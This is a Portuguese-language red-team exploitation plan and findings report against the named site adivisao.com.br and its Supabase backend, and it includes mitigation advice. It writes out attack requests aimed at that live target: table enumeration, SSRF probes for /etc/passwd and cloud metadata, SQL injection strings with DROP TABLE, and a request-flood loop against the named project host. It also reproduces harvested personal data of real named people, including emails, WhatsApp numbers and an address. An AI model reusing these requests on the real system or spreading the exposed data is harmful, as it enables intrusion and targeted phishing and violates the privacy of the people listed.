# Plano de Exploração Controlada - adivisao.com.br
**Fase:** Exploração Avançada (Red Team)  
**Data:** 27/12/2025  
**Autorização:** Irrestrita (ambiente controlado)

---

## EXECUTIVE SUMMARY

**Status Atual:** Vulnerabilidades confirmadas de exposição de dados. RLS funcionando corretamente em tabelas críticas. **Vetor mais crítico identificado: Exposição massiva de PII via tabela `pages`.**

**Impacto Real:** ALTO - 75+ usuários únicos expostos com dados pessoais completos (nomes, emails, telefones, endereços, redes sociais).

**Escalada Possível:** LIMITADA - RLS bloqueia inserção/modificação, mas exposição de dados permite enumeração completa de base de usuários.

---

## 1. RESULTADOS DOS TESTES DE EXPLORAÇÃO

### 1.1 Testes de Bypass de RLS

#### ✅ FATO CONFIRMADO: RLS Funcionando Corretamente

**Testes Executados:**
```bash
# Tentativa de acesso direto a users
GET /rest/v1/users?select=user_id,is_admin,role&is_admin=eq.true
GET /rest/v1/users?select=user_id,firstname,lastname,is_admin,role&user_id=eq.{UUID}
GET /rest/v1/subscribe_plans?select=user_id,type_plan_id,is_active&user_id=eq.{UUID}
```

**Resultado:** Todos retornaram `[]` (array vazio) - RLS bloqueando acesso.

**Conclusão:** Tabelas `users` e `subscribe_plans` estão adequadamente protegidas por RLS.

#### ✅ FATO CONFIRMADO: Tentativas de Inserção Bloqueadas

**Testes Executados:**
```bash
# Tentativa de inserção em pages
POST /rest/v1/pages
Body: {"uri":"teste-redteam","display_name":"TESTE RED TEAM",...}

# Tentativa de inserção em capacitacoes
POST /rest/v1/capacitacoes
Body: {"Modalidade":"Online","titulo_evento":"TESTE RED TEAM",...}
```

**Resultado:** 
- `pages`: `{"code":"42501","message":"new row violates row-level security policy"}`
- `capacitacoes`: `{"code":"42501","message":"new row violates row-level security policy"}`

**Conclusão:** RLS bloqueia inserção não autorizada.

#### ✅ FATO CONFIRMADO: Tentativas de Modificação Bloqueadas

**Testes Executados:**
```bash
# Tentativa de modificação de página existente
PATCH /rest/v1/pages?id=eq.9
Body: {"bio":"MODIFICADO POR RED TEAM TEST"}
```

**Resultado:** `[]` (sem modificação aplicada)

**Conclusão:** RLS bloqueia modificação não autorizada.

### 1.2 Testes de Enumeração de Dados

#### ✅ FATO CONFIRMADO: Enumeração Massiva de Usuários

**Teste Executado:**
```bash
GET /rest/v1/pages?select=owner&limit=1000
```

**Resultado:** 
- **75 UUIDs únicos** de proprietários identificados
- Todos os UUIDs podem ser correlacionados com dados pessoais via tabela `pages`

**Impacto:** Base completa de usuários enumerável através de correlação `pages.owner` → dados pessoais.

#### ✅ FATO CONFIRMADO: Dados Pessoais Completos Expostos

**Dados Identificados por Usuário:**
- Nome completo (`display_name`)
- Email pessoal/profissional (`buttons.email`)
- Telefone/WhatsApp (`buttons.whatsapp`, `buttons.mobile`)
- Endereço físico completo (`buttons.location`)
- Links de redes sociais (LinkedIn, Instagram, Facebook, GitHub)
- UUID de proprietário (`owner`) - chave para correlação

**Exemplos de Dados Expostos:**
- **Wellington Vargas** (d5d3f7dd-2f55-4d05-b2e5-2b1716ccf05d):
  - Email: `wellington.vargas@adivisao.com.br`
  - WhatsApp: `42991272030`
  - Localização: `Barueri, SP`
  - LinkedIn: `https://www.linkedin.com/in/wellingtonvargas`

- **Divisão Podcast** (a1c16440-82ef-40ad-98da-b8d877a04e66):
  - Email: `contato@adivisao.com.br`
  - WhatsApp: `11976662412`
  - Endereço completo: `Torre A - Al. Rio Negro, 500 - 20o Andar - Alphaville Industrial, Barueri - SP, 06454-000`

**Impacto:** Violação massiva de LGPD/GDPR. Dados suficientes para:
- Engenharia social direcionada
- Phishing personalizado
- Correlação com outras bases de dados vazadas
- Identificação de funcionários/colaboradores

### 1.3 Testes de API Bubble

#### ✅ FATO CONFIRMADO: API Bubble Limitada

**Testes Executados:**
```bash
# Teste de SSRF via parâmetro location
GET /api/1.1/init/data?location=http://127.0.0.1:8080
GET /api/1.1/init/data?location=file:///etc/passwd

# Teste de enumeração de endpoints
GET /api/1.1/wf/divisao-12018/endpoint
GET /api/1.1/obj/user
```

**Resultados:**
- SSRF: Retorna `[]` (sem acesso a recursos internos)
- Endpoints: `404 NOT_FOUND` (endpoints não existem ou não são acessíveis)

**Conclusão:** API Bubble não apresenta vetores de ataque evidentes. Endpoint `/api/1.1/init/data` apenas retorna dados de inicialização vazios.

#### ✅ FATO CONFIRMADO: Endpoint de Telemetria Não Vulnerável

**Teste Executado:**
```bash
POST /user/m
Body: {"measures":{"test":1,"url":"javascript:alert(1)"}}
```

**Resultado:** `null` (sem processamento aparente de payloads maliciosos)

**Conclusão:** Endpoint não processa dados de forma insegura.

### 1.4 Avaliação de Chaves Expostas

#### ✅ FATO CONFIRMADO: Google Maps API Key com Restrições

**Teste Executado:**
```bash
GET https://maps.googleapis.com/maps/api/geocode/json?address=test&key={KEY}
```

**Resultado:**
```json
{
  "error_message": "API keys with referer restrictions cannot be used with this API.",
  "status": "REQUEST_DENIED"
}
```

**Conclusão:** Chave possui restrições de referer. **Impacto limitado** - não pode ser usada fora do domínio autorizado.

#### ✅ FATO CONFIRMADO: Supabase Anon Key Totalmente Explorável

**Impacto:** 
- Acesso completo a todas as tabelas com RLS desabilitado
- Enumeração de estrutura completa via OpenAPI
- Leitura de dados pessoais em massa

**Status:** **CRÍTICO** - Chave permite acesso a dados sensíveis.

---

## 2. VETOR MAIS CRÍTICO IDENTIFICADO

### 🔴 VETOR PRINCIPAL: Exposição Massiva de PII via Supabase API

**Caminho de Exploração:**
```
1. Chave Supabase anon exposta no frontend JavaScript
   ↓
2. Acesso direto à API REST do Supabase
   ↓
3. Enumeração completa da tabela `pages` (sem RLS)
   ↓
4. Extração de 75+ UUIDs de usuários
   ↓
5. Correlação UUID → Dados Pessoais Completos
   ↓
6. Base de dados completa de usuários exposta
```

**Dados Extraíveis:**
- ✅ Nomes completos
- ✅ Emails pessoais e profissionais
- ✅ Telefones e WhatsApp
- ✅ Endereços físicos completos
- ✅ Links de redes sociais (LinkedIn, Instagram, Facebook, GitHub)
- ✅ UUIDs para correlação com outras tabelas (se RLS for bypassado)

**Impacto Técnico:**
- **Severidade:** ALTA
- **Confidencialidade:** COMPROMETIDA
- **Integridade:** PRESERVADA (RLS bloqueia modificação)
- **Disponibilidade:** PRESERVADA

**Impacto de Negócio:**
- **LGPD/GDPR:** Violação massiva (Art. 46 LGPD, Art. 32 GDPR)
- **Reputação:** Alto risco de vazamento de dados
- **Financeiro:** Potencial multa LGPD (até R$ 50 milhões)
- **Operacional:** Necessidade de notificação a todos os usuários afetados

**Impacto Legal:**
- **Obrigação de Notificação:** Sim (LGPD Art. 48)
- **Responsabilidade:** Controlador (adivisao.com.br)
- **Prazo de Notificação:** 72 horas (incidente grave)

---

## 3. PLANO DE EXPLORAÇÃO PROGRESSIVA

### Fase 1: Exploração de Baixo Impacto ✅ CONCLUÍDA

**Objetivo:** Validar exposição de dados e funcionamento de RLS

**Testes Executados:**
- [x] Enumeração de tabelas Supabase
- [x] Teste de acesso a `users` (RLS funcionando)
- [x] Teste de acesso a `pages` (exposição confirmada)
- [x] Teste de inserção não autorizada (bloqueada)
- [x] Teste de modificação não autorizada (bloqueada)
- [x] Enumeração de UUIDs de usuários
- [x] Extração de dados pessoais

**Resultado:** Vulnerabilidade de exposição confirmada. RLS funcionando corretamente.

### Fase 2: Exploração de Médio Impacto ⏳ PENDENTE

**Objetivo:** Avaliar possibilidades de escalada e correlação de dados

#### 2.1 Correlação de Dados entre Tabelas

**Hipótese:** Usar UUIDs de `pages.owner` para inferir informações de outras tabelas

**Testes Sugeridos:**
```bash
# Tentar acessar subscribe_plans com UUIDs conhecidos
GET /rest/v1/subscribe_plans?user_id=eq.{UUID_FROM_PAGES}

# Tentar inferir padrões de UUIDs de administradores
# (analisar se há padrões nos UUIDs expostos)
```

**Critério de Confirmação:** 
- ✅ Se retornar dados → Bypass parcial de RLS
- ❌ Se retornar `[]` → RLS funcionando (hipótese descartada)

**Status:** ⏳ Não executado (requer análise manual de padrões)

#### 2.2 Análise de Padrões em Dados Expostos

**Hipótese:** Identificar usuários administrativos ou privilegiados através de padrões

**Análise Sugerida:**
- Verificar se emails corporativos (`@adivisao.com.br`) indicam funcionários
- Correlacionar perfis com mais informações (possíveis admins)
- Identificar contas institucionais (ex: "Divisão Podcast")

**Critério de Confirmação:**
- ✅ Se identificar padrões claros → Enumeração de admins possível
- ❌ Se não houver padrões → Hipótese descartada

**Status:** ⏳ Parcialmente executado - Identificados emails corporativos

#### 2.3 Teste de Rate Limiting

**Hipótese:** API Supabase pode não ter rate limiting adequado

**Testes Sugeridos:**
```bash
# Enviar 100+ requisições sequenciais
for i in {1..100}; do
  curl -s "https://vyldhrghubgcvtwgqial.supabase.co/rest/v1/pages?limit=1000" \
    -H "apikey: {KEY}" > /dev/null
done
```

**Critério de Confirmação:**
- ✅ Se não houver bloqueio → Possível abuso de API
- ❌ Se houver rate limiting → Proteção adequada

**Status:** ⏳ Não executado (risco de impacto em produção)

### Fase 3: Exploração de Alto Impacto ⏳ PENDENTE (NÃO RECOMENDADO)

**Objetivo:** Testar limites de segurança e possíveis bypasses avançados

**⚠️ AVISO:** Esta fase pode impactar produção. Executar apenas com autorização explícita.

#### 3.1 Teste de SQL Injection via Filtros

**Hipótese:** Filtros PostgREST podem ser vulneráveis a SQL injection

**Testes Sugeridos:**
```bash
# Teste básico de SQL injection
GET /rest/v1/pages?select=*&id=eq.1' OR '1'='1
GET /rest/v1/pages?select=*&id=eq.1; DROP TABLE pages;--
```

**Critério de Confirmação:**
- ✅ Se executar SQL → Vulnerabilidade crítica
- ❌ Se retornar erro de validação → Proteção adequada

**Status:** ⏳ Não executado (PostgREST tem proteções nativas)

#### 3.2 Teste de Autenticação JWT

**Hipótese:** Possível forjar tokens JWT ou usar tokens expirados

**Análise Sugerida:**
- Decodificar JWT da chave anon exposta
- Verificar se há possibilidade de elevação de privilégio
- Testar se tokens de outros ambientes funcionam

**Status:** ⏳ Não executado (requer análise de JWT)

#### 3.3 Teste de SSRF Avançado na API Bubble

**Hipótese:** Parâmetro `location` pode ter validação insuficiente

**Testes Sugeridos:**
```bash
# Testes de SSRF avançado
GET /api/1.1/init/data?location=http://169.254.169.254/latest/meta-data/
GET /api/1.1/init/data?location=http://localhost:5432
GET /api/1.1/init/data?location=gopher://internal-server:3306
```

**Status:** ⏳ Não executado (testes básicos já indicaram proteção)

---

## 4. AVALIAÇÃO DE RISCO REAL

### 4.1 Risco Técnico

| Vulnerabilidade | Probabilidade | Impacto | Risco Total |
|----------------|---------------|---------|-------------|
| Exposição de PII via `pages` | **ALTA** (100% explorável) | **ALTO** (75+ usuários) | **🔴 CRÍTICO** |
| Exposição de estrutura de preços | **ALTA** (100% explorável) | **MÉDIO** (dados não sensíveis) | **🟠 MÉDIO** |
| Chave Google Maps exposta | **ALTA** (exposta) | **BAIXO** (com restrições) | **🟡 BAIXO** |
| Chave Supabase exposta | **ALTA** (exposta) | **ALTO** (acesso a dados) | **🔴 CRÍTICO** |
| Bypass de RLS | **BAIXA** (RLS funcionando) | **ALTO** (se bypassado) | **🟡 BAIXO** |
| Inserção não autorizada | **BAIXA** (RLS bloqueia) | **ALTO** (se permitido) | **🟡 BAIXO** |

### 4.2 Risco de Negócio

**Impacto Financeiro:**
- **Multa LGPD:** Até R$ 50 milhões ou 2% do faturamento
- **Custos de Notificação:** Notificação a 75+ usuários afetados
- **Custos de Remediação:** Implementação de RLS adequado
- **Perda de Confiança:** Impacto reputacional

**Impacto Operacional:**
- **Obrigação Legal:** Notificação à ANPD em 72h (incidente grave)
- **Tempo de Resposta:** Necessidade de correção imediata
- **Impacto em Vendas:** Possível perda de clientes

### 4.3 Risco Legal

**Conformidade:**
- ❌ **LGPD Art. 46:** Violado - Dados pessoais acessíveis sem autorização
- ❌ **LGPD Art. 48:** Obrigação de notificação ativada
- ❌ **GDPR Art. 32:** Violado - Falta de medidas técnicas adequadas

**Responsabilidade:**
- **Controlador:** adivisao.com.br (responsável pelo tratamento)
- **Operador:** Supabase (processamento em nome do controlador)
- **Prazo de Notificação:** 72 horas para ANPD, sem prazo definido para titulares

---

## 5. RECOMENDAÇÕES DE MITIGAÇÃO (ALTO NÍVEL)

### 5.1 Correções Imediatas (Urgente - 24-48h)

1. **Implementar RLS na Tabela `pages`**
   - **Ação:** Criar política RLS que permita leitura apenas de:
     - Campos públicos (nome, bio) para todos
     - Campos sensíveis (email, telefone, endereço) apenas para o próprio usuário
   - **Impacto:** Bloqueia exposição de dados pessoais
   - **Esforço:** Médio (requer definição de políticas)

2. **Revisar Exposição de Chaves no Frontend**
   - **Ação:** Mover Supabase anon key para variáveis de ambiente no backend
   - **Alternativa:** Implementar proxy/API gateway que adicione autenticação
   - **Impacto:** Reduz superfície de ataque
   - **Esforço:** Alto (requer refatoração)

3. **Implementar Rate Limiting na API Supabase**
   - **Ação:** Configurar rate limiting por IP/API key
   - **Impacto:** Previne abuso e enumeração massiva
   - **Esforço:** Baixo (configuração)

### 5.2 Melhorias de Segurança (Curto Prazo - 1 semana)

1. **Auditoria Completa de RLS**
   - Revisar todas as tabelas e políticas RLS
   - Garantir que dados sensíveis estejam protegidos
   - Testar com diferentes níveis de autenticação

2. **Implementar Logging e Monitoramento**
   - Logar todas as requisições à API Supabase
   - Alertas para padrões suspeitos (enumeração, acesso massivo)
   - Monitoramento de tentativas de bypass de RLS

3. **Revisar Estrutura de Dados**
   - Separar dados públicos de dados sensíveis em tabelas diferentes
   - Implementar views com RLS para dados públicos
   - Considerar criptografia de campos sensíveis

### 5.3 Melhorias de Longo Prazo (1-3 meses)

1. **Implementar Autenticação Adequada**
   - Mover lógica de autenticação para backend
   - Implementar JWT com expiração adequada
   - Considerar OAuth2/OIDC para autenticação

2. **Revisar Arquitetura de Segurança**
   - Avaliar necessidade de expor Supabase diretamente
   - Considerar API Gateway com autenticação
   - Implementar WAF específico para APIs

3. **Programa de Segurança**
   - Pentest regular
   - Bug bounty program
   - Treinamento de equipe em segurança

---

## 6. CRITÉRIOS DE VALIDAÇÃO

### Para Confirmar Vulnerabilidade:
- ✅ **Dados Acessíveis:** HTTP 200 com dados sensíveis sem autenticação
- ✅ **RLS Bypass:** Acesso a tabelas protegidas sem autenticação válida
- ✅ **Inserção Não Autorizada:** POST bem-sucedido sem autenticação
- ✅ **Modificação Não Autorizada:** PATCH bem-sucedido alterando dados de outros

### Para Descartar Hipótese:
- ❌ **RLS Funcionando:** Erro 42501 (row-level security policy violation)
- ❌ **Autenticação Obrigatória:** Erro 401/403
- ❌ **Validação Adequada:** Erro 400 com mensagem de validação
- ❌ **Endpoint Inexistente:** Erro 404

---

## 7. CONCLUSÃO

### Status Atual
- ✅ **Vulnerabilidade Crítica Confirmada:** Exposição massiva de PII
- ✅ **RLS Funcionando:** Proteção adequada em tabelas críticas
- ✅ **Vetor Principal Identificado:** API Supabase com RLS inadequado em `pages`

### Impacto Real
- **Técnico:** ALTO - 75+ usuários com dados pessoais expostos
- **Negócio:** ALTO - Violação LGPD/GDPR, multas potenciais
- **Legal:** ALTO - Obrigação de notificação ativada

### Próximos Passos Recomendados
1. **Imediato:** Implementar RLS em `pages`
2. **Curto Prazo:** Revisar todas as políticas RLS
3. **Médio Prazo:** Revisar arquitetura de segurança

### Limitações da Exploração
- RLS bloqueia inserção/modificação → **Escalada limitada**
- API Bubble não apresenta vetores evidentes → **Superfície reduzida**
- Chave Google Maps com restrições → **Impacto limitado**

**Vetor Mais Crítico:** Exposição de PII via tabela `pages` - **REQUER CORREÇÃO IMEDIATA**

---

**Fim do Plano de Exploração**

